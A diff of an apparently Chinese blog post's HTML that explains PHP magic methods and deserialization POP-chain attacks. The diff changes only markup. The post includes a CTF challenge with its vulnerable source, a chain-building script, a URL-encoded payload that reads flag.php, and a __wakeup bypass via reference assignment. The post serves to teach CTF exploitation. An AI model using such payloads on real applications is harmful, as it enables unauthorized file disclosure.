@@ -481,32 +481,31 @@
  __unset() //------- 在不可访问的属性上使用unset()时触发
  __toString() //---- 把类当作字符串使用时触发
  __invoke() //------ 当尝试将对象调用为函数时触发
-</code></pre>
-<p><img src="https://article.biliimg.com/bfs/article/68999751aa01f1b8f8ab42b98c884a2b290349942.png"></p>
+</code></pre><p><img src="https://article.biliimg.com/bfs/article/68999751aa01f1b8f8ab42b98c884a2b290349942.png" alt=""></p>
 <p>可以参考：<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php">php函数</a></p>
 <h2 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h2><p>当一个对象被创建时自动调用这个方法 即 <code>$a=new A()</code>时会自动调用</p>
 <h2 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h2><p>在对象上下文中调用不可访问的方法时触发</p>
 <p>调用不存在的方法</p>
-<p><img src="https://article.biliimg.com/bfs/article/8bb6fecbb0a8ac196c721735769fd977290349942.png"></p>
+<p><img src="https://article.biliimg.com/bfs/article/8bb6fecbb0a8ac196c721735769fd977290349942.png" alt=""></p>
 <p>既这个类中存在这个函数，却调用他就会触发</p>
 <h2 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h2><p>触发时机：静态调用或调用成员常量时使用的方法不存在</p>
-<p><img src="https://article.biliimg.com/bfs/article/059f106a1158c4776e925f97633913b4290349942.png"></p>
+<p><img src="https://article.biliimg.com/bfs/article/059f106a1158c4776e925f97633913b4290349942.png" alt=""></p>
 <h2 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h2><p>当有__get()函数时，每次调用属性都将调用这个魔术方法，所以每次调用都会触发<br>触发时机：调用的成员属性不存在<br>参数：传参$arg1<br>返回值：不存在的成员属性的名称</p>
-<p><img src="https://article.biliimg.com/bfs/article/e42209219be3f09a12045c28eb3b0dfd290349942.png"></p>
-<h2 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h2><p><img src="https://article.biliimg.com/bfs/article/7651dc536e2a7b1d6922412d26a49626290349942.png"><br>触发时机：给不存在的成员属性赋值</p>
-<h2 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h2><p><img src="https://article.biliimg.com/bfs/article/ce2c20e04d0dccf7590cd0e36ae89995290349942.png"></p>
-<h2 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h2><p><img src="https://article.biliimg.com/bfs/article/4584ffc19e0ad73b4eb0300bed776077290349942.png"></p>
-<h2 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h2><p><img src="https://article.biliimg.com/bfs/article/cae326f193dca3a05a505187e8da803d290349942.png"></p>
+<p><img src="https://article.biliimg.com/bfs/article/e42209219be3f09a12045c28eb3b0dfd290349942.png" alt=""></p>
+<h2 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h2><p><img src="https://article.biliimg.com/bfs/article/7651dc536e2a7b1d6922412d26a49626290349942.png" alt=""><br>触发时机：给不存在的成员属性赋值</p>
+<h2 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h2><p><img src="https://article.biliimg.com/bfs/article/ce2c20e04d0dccf7590cd0e36ae89995290349942.png" alt=""></p>
+<h2 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h2><p><img src="https://article.biliimg.com/bfs/article/4584ffc19e0ad73b4eb0300bed776077290349942.png" alt=""></p>
+<h2 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h2><p><img src="https://article.biliimg.com/bfs/article/cae326f193dca3a05a505187e8da803d290349942.png" alt=""></p>
 <h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h2><p>当<code>echo</code> 或者<code>.</code>拼接对象时会调用这个魔术方法</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://article.biliimg.com/bfs/article/3a4f3c43dbe7551b63d1ba0acb9644b2290349942.png"></p>
-<p><img src="https://article.biliimg.com/bfs/article/378faea7aae4a78746ce142000513a65290349942.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://article.biliimg.com/bfs/article/3a4f3c43dbe7551b63d1ba0acb9644b2290349942.png" alt=""></p>
+<p><img src="https://article.biliimg.com/bfs/article/378faea7aae4a78746ce142000513a65290349942.png" alt=""></p>
 <h1 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h1><p>如果存在私有属性，则需要url加密</p>
-<pre><code class="php">urlencode(serialize($b));
+<pre><code class="lang-php">urlencode(serialize($b));
 </code></pre>
 <p>因为私有属性前面和后面存在<code>%00</code></p>
-<p><img src="https://article.biliimg.com/bfs/article/6ecb111d663b048a8cbe8f00eaa4b4a6290349942.png"></p>
+<p><img src="https://article.biliimg.com/bfs/article/6ecb111d663b048a8cbe8f00eaa4b4a6290349942.png" alt=""></p>
 <h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>例题：小白进群题</p>
-<pre><code class="php">&lt;?php
+<pre><code class="lang-php">&lt;?php
 //flag is in flag.php
 highlight_file(__FILE__);
 error_reporting(0);
@@ -551,7 +550,7 @@ if(isset($_GET[&#39;pop&#39;]))&#123;
 ?&gt;
 </code></pre>
 <p>pop链</p>
-<pre><code class="php">&lt;?php
+<pre><code class="lang-php">&lt;?php
 //flag is in flag.php
 highlight_file(__FILE__);
 error_reporting(0);
@@ -595,12 +594,12 @@ echo urlencode(serialize($b));
 ?&gt;
 </code></pre>
 <p>结果</p>
-<pre><code class="php">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A13%3A%22%00Modifier%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D
+<pre><code class="lang-php">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A13%3A%22%00Modifier%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D
 </code></pre>
 <h1 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h1><p><code>__construct()</code> <code>__sleep()</code> 可能会影响pop链的构造，如果影响了得删了<br><code>__wakeup</code> 可能是不需要的，需要绕过</p>
-<h1 id="php引用赋值"><a href="#php引用赋值" class="headerlink" title="php引用赋值&amp;"></a>php引用赋值&amp;</h1><p><a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">参考大佬文章补充的</a></p>
+<h1 id="php引用赋值-amp"><a href="#php引用赋值-amp" class="headerlink" title="php引用赋值&amp;"></a>php引用赋值&amp;</h1><p><a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">参考大佬文章补充的</a></p>
 <p>php中可以使两个变量指向同一个内存地址</p>
-<pre><code class="php">
+<pre><code class="lang-php">
 &lt;?php
 function test (&amp;$a)&#123;
     $x=&amp;$a;
@@ -612,8 +611,7 @@ echo $a;
 </code></pre>
 <p>输出:</p>
 <pre><code>123
-</code></pre>
-<pre><code class="php">
+</code></pre><pre><code class="lang-php">
 &lt;?php
 
 class KeyPort&#123;
@@ -640,7 +638,7 @@ if(isset($_POST[&#39;pop&#39;]))&#123;
 &#125;
 </code></pre>
 <p>这题的绕过可以通过的引用赋值的方法，让key的值改变的时候也改变wakeup的值</p>
-<pre><code class="php">&lt;?php
+<pre><code class="lang-php">&lt;?php
 
 class KeyPort&#123;
     public $key;
